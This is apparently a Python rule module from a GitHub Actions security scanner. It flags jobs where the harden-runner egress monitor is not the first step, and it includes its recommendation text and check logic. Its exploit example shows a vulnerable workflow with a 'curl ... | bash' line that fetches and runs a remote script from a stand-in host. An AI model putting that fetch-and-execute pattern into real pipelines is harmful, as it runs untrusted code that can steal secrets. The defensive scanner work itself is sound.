"""GHA-109. harden-runner is not the first step in the job.

step-security/harden-runner installs its egress monitor by running as
a job step. It can only see (and, in block mode, filter) traffic that
happens *after* it starts. StepSecurity's own guidance is that the
harden-runner step must be the first step in the job. When another
step runs before it, that step's outbound traffic is unmonitored and
unfiltered: a `run:` that does `curl | bash`, a setup action that
pulls from a registry, or a checkout of attacker-influenced code all
get a free pass before the agent is even up.

Low severity and low-FP: it only fires on jobs that already adopted
harden-runner, and the fix is to move the step to the top. The common
case (a `checkout` placed before harden-runner) is a small gap, hence
LOW, but it's still a gap the recommended layout closes. Complements
GHA-107 (audit mode) and GHA-108 (no agent at all).
"""
from __future__ import annotations

from typing import Any

from ...base import Finding, Severity
from ...rule import Rule
from ..base import iter_jobs, iter_steps, step_location

_HARDEN_RUNNER = "step-security/harden-runner"

RULE = Rule(
    id="GHA-109",
    title="harden-runner is not the first step in the job",
    severity=Severity.LOW,
    owasp=("CICD-SEC-7", "CICD-SEC-10"),
    esf=("ESF-D-BUILD-ENV",),
    cwe=("CWE-696",),  # Incorrect Behavior Order
    recommendation=(
        "Move the `step-security/harden-runner` step to the top of the "
        "job, before `actions/checkout` and any `run:` or setup step. "
        "harden-runner only monitors (and in block mode filters) "
        "traffic that happens after it starts, so any step that runs "
        "before it egresses unwatched. StepSecurity's guidance is that "
        "harden-runner is always the first step."
    ),
    docs_note=(
        "Fires when a job uses `step-security/harden-runner` but the "
        "step is not first: at least one step precedes it. Those "
        "earlier steps run before the egress monitor is up, so their "
        "outbound traffic is neither recorded nor filtered.\n\n"
        "Passes when harden-runner is the first step, and is not "
        "applicable (passes) when the job doesn't use harden-runner at "
        "all. Severity is LOW because the most common shape (a checkout "
        "placed first) is a small gap and the fix is a one-line move."
    ),
    known_fp=(
        "A `checkout` placed before harden-runner is a minor gap: the "
        "checkout reaches GitHub, which is allowed regardless. If your "
        "pre-harden-runner steps provably make no network calls, the "
        "exposure is negligible. Suppress per-job once confirmed.",
    ),
    incident_refs=(
        "StepSecurity docs, harden-runner usage: the action is "
        "documented to run as the first step of the job so the egress "
        "baseline covers the whole run. "
        "https://github.com/step-security/harden-runner",
    ),
    exploit_example=(
        "# Vulnerable: a `run:` step executes before harden-runner, so\n"
        "# its egress is unmonitored. A malicious `install.sh` fetched\n"
        "# here can exfiltrate before the agent is even up.\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: actions/checkout@<sha>\n"
        "      - run: curl -fsSL https://example.test/install.sh | bash\n"
        "      - uses: step-security/harden-runner@<sha>\n"
        "        with:\n"
        "          egress-policy: block\n"
        "          allowed-endpoints: >\n"
        "            github.com:443\n"
        "\n"
        "# Safe: harden-runner is the first step, so every later step\n"
        "# (checkout, install, build) runs under the egress allowlist.\n"
        "jobs:\n"
        "  build:\n"
        "    runs-on: ubuntu-latest\n"
        "    steps:\n"
        "      - uses: step-security/harden-runner@<sha>\n"
        "        with:\n"
        "          egress-policy: block\n"
        "          allowed-endpoints: >\n"
        "            github.com:443\n"
        "      - uses: actions/checkout@<sha>\n"
        "      - run: ./install.sh"
    ),
)


def _is_harden_runner(uses: Any) -> bool:
    if not isinstance(uses, str):
        return False
    return uses.split("@", 1)[0].strip().lower() == _HARDEN_RUNNER


def check(path: str, doc: dict[str, Any]) -> Finding:
    offenders: list[str] = []
    locations = []
    saw_harden_runner = False
    for job_id, job in iter_jobs(doc):
        steps = list(iter_steps(job))
        hr_index = next(
            (i for i, s in enumerate(steps) if _is_harden_runner(s.get("uses"))),
            None,
        )
        if hr_index is None:
            continue
        saw_harden_runner = True
        if hr_index > 0:
            offenders.append(f"{job_id} (step {hr_index + 1})")
            locations.append(step_location(path, steps[hr_index]))

    if not saw_harden_runner:
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=path,
            description="No harden-runner step to evaluate.",
            recommendation="No action required.", passed=True,
        )

    passed = not offenders
    desc = (
        "harden-runner is the first step in every job that uses it."
        if passed else
        f"{len(offenders)} job(s) run harden-runner after another step: "
        f"{', '.join(offenders[:5])}"
        f"{'...' if len(offenders) > 5 else ''}. Steps before "
        f"harden-runner egress with no monitoring or filtering."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
        locations=locations,
    )
